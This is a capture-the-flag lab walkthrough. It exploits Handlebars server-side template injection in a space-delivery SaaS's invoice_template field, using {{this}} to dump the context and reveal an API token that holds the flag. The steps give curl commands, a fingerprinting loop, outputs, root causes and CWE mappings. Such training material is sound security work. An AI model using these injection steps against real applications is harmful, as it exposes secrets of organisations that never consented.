# galaxydash-011 - BugForge Lab Walkthrough

**URL:** https://lab-1781478001649-43kxbb.labs-app.bugforge.io/  
**Difficulty:** Medium  
**Vulnerability:** Server-Side Template Injection (Handlebars) via `invoice_template` → context dump → flag in `billing.api_token`  
**Flag:** `bug{PDVYikz7NbjxMkVzRHpVxnzBNTevSspS}`

---

## Summary

Galaxy Dash is a multi-tenant space-delivery SaaS. Every registrant becomes an `org_admin` for their own organization. The organization settings include an `invoice_template` field that accepts Handlebars syntax and is rendered server-side when an invoice is fetched. Setting the template to `{{this}}` serializes the full Handlebars context as JSON, which includes a `billing.api_token` field not exposed through any other endpoint. That field contains the flag.

## Tech Stack

- React SPA (CRA), JWT stored in localStorage
- Express.js (Node.js), SQLite
- **Handlebars** template engine (server-side invoice rendering)
- Multi-tenant: each registration creates a new organization; registrant gets `org_admin` role

## Key Endpoints

| Endpoint | Method | Auth | Notes |
|----------|--------|------|-------|
| `/api/register` | POST | No | Fields: `username`, `email`, `password`, `org_name`, `full_name`, `business_type` |
| `/api/organization` | GET | JWT | Returns org settings including `invoice_template` |
| `/api/organization` | PUT | JWT (org_admin) | Updates org settings - **injection point** |
| `/api/locations` | GET | JWT | Returns valid location IDs for booking |
| `/api/services` | GET | JWT | Returns service IDs (some `earth_only`) |
| `/api/bookings` | POST | JWT | Creates a booking, generates an invoice |
| `/api/invoices/:bookingId` | GET | JWT | Renders `invoice_template` via Handlebars, returns `branding` field |

## Attack Chain

### Step 1 - Register and confirm org_admin role

Registration requires `org_name`, `full_name`, and `business_type` in addition to the standard fields - these are not shown on any error until you inspect the JS bundle.

```bash
curl -X POST https://TARGET/api/register \
  -H "Content-Type: application/json" \
  -d '{
    "username": "attacker",
    "email": "attacker@test.com",
    "password": "Password1!",
    "org_name": "EvilCorp",
    "full_name": "Eve Attacker",
    "business_type": "retail"
  }'
# → {"token":"...","user":{"id":5,"role":"org_admin","organizationId":4,"permissions":{...}}}
```

### Step 2 - Verify variable substitution in invoice_template

Confirm the field is rendered, not stored raw. The default template in `GET /api/organization` already uses `{{ invoice.number }}` and `{{ organization.name }}` - a strong signal.

```bash
TOKEN="<your_jwt>"

curl -X PUT https://TARGET/api/organization \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "EvilCorp",
    "business_type": "retail",
    "invoice_template": "NUM={{ invoice.number }} ORG={{ organization.name }}"
  }'
# → {"message":"Organization updated successfully"}
```

Create a booking so there is an invoice to render against:

```bash
curl -X POST https://TARGET/api/bookings \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "origin_location_id": 1,
    "destination_location_id": 4,
    "cargo_size": "medium",
    "cargo_weight_kg": 100,
    "cargo_description": "test",
    "danger_level": 0,
    "has_insurance": false,
    "has_premium_tracking": false,
    "service_id": 1,
    "total_price": 300,
    "calculated_risk_percent": 0,
    "estimated_delivery_minutes": 10
  }'
# → {"id":1,"message":"Booking created successfully",...}
```

Fetch the invoice and check the `branding` field:

```bash
curl -s https://TARGET/api/invoices/1 \
  -H "Authorization: Bearer $TOKEN" | python3 -c "import sys,json; print(json.load(sys.stdin)['branding'])"
# → NUM=GD-2026-000001 ORG=EvilCorp
```

Variable substitution is confirmed.

### Step 3 - Fingerprint the template engine

```bash
for tpl in '{{7*7}}' '{{ "x" | upper }}' '{{#if true}}YES{{/if}}' '{{this}}'; do
  curl -s -X PUT https://TARGET/api/organization \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"name\":\"EvilCorp\",\"business_type\":\"retail\",\"invoice_template\":\"$tpl\"}" > /dev/null
  result=$(curl -s https://TARGET/api/invoices/1 -H "Authorization: Bearer $TOKEN" \
    | python3 -c "import sys,json; print(json.load(sys.stdin)['branding'])")
  echo "$tpl => $result"
done
```

Results:

| Payload | Result | Inference |
|---------|--------|-----------|
| `{{7*7}}` | (empty) | Not Jinja2/Nunjucks - no arithmetic without helpers |
| `{{ "x" \| upper }}` | (empty) | Not Nunjucks - filters unsupported |
| `{{#if true}}YES{{/if}}` | `YES` | **Handlebars** block helper confirmed |
| `{{this}}` | Full JSON context | **Handlebars context object serialized** |

### Step 4 - Dump context with `{{this}}`

`{{this}}` in Handlebars refers to the root context object. When the template context is an object, Handlebars serializes it to its string representation - in Express apps this typically calls `JSON.stringify` or `toString()` on the object, revealing all fields.

```bash
curl -s -X PUT https://TARGET/api/organization \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"EvilCorp","business_type":"retail","invoice_template":"{{this}}"}'

curl -s https://TARGET/api/invoices/1 \
  -H "Authorization: Bearer $TOKEN" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['branding'])"
```

Output:

```json
{
  "organization": {"name": "EvilCorp", "address": null, "tax_id": ""},
  "invoice": {"number": "GD-2026-000001", "subtotal": 300, "tax": 24, "total": 324},
  "billing": {
    "account_id": "GD-ACCT-000004",
    "currency": "credits",
    "api_token": "bug{PDVYikz7NbjxMkVzRHpVxnzBNTevSspS}"
  }
}
```

The `billing.api_token` field is not returned by `GET /api/organization` or any other documented endpoint - it only surfaces through the template context dump.

**Flag:** `bug{PDVYikz7NbjxMkVzRHpVxnzBNTevSspS}`

## Discovery Notes

- `GET /api/organization` revealed the `invoice_template` field with `{{ }}` syntax in the default value - immediate SSTI candidate
- JS bundle (`main.6e0c19b4.js`) confirmed the update verb is `PUT` (not PATCH) via `cr.put("/api/organization", ...)`
- Registration field names (`org_name`, `full_name`, `business_type`) extracted from the bundle's `name:` attributes - the API error only says "required" without listing them
- `billing.account_id` in the response (`GD-ACCT-000004`) during normal variable substitution revealed that a `billing` context object existed - worth dumping in full

## Dead Ends

| Attempt | Why it failed | Lesson |
|---------|--------------|--------|
| `PATCH /api/organization` | 404 - verb is `PUT` | Check JS bundle for the actual HTTP method |
| `{{7*7}}` | Empty - Handlebars doesn't evaluate arithmetic without custom helpers | Can't use math to confirm SSTI; use block helpers instead |
| `{{constructor.name}}` | Empty - Handlebars sandbox blocks prototype chain traversal | Prototype access is blocked; `{{this}}` is sufficient for context dump |
| `{{ "x" \| upper }}` | Unchanged - Nunjucks/Jinja2 filter syntax not recognized | Ruled out Nunjucks; confirmed Handlebars |
| `/api/flag`, `/api/admin` (unauthenticated) | All returned 200 with SPA HTML - React router catches unknown paths | False positives from the SPA; these endpoints don't exist on the server |

## Root Causes

- `invoice_template` is passed directly to `Handlebars.compile()` with the full billing context - no field allowlist, no `{{this}}` restriction
- The `billing` context object passed to the template includes `api_token`, a field that should be excluded from template scope
- Any `org_admin` (every registered user) can update `invoice_template` and trigger rendering via a booking they own

## CWE / OWASP

- **CWE-94**: Improper Control of Generation of Code (Server-Side Template Injection)
- **CWE-200**: Exposure of Sensitive Information to an Unauthorized Actor
- **OWASP A03:2021** - Injection
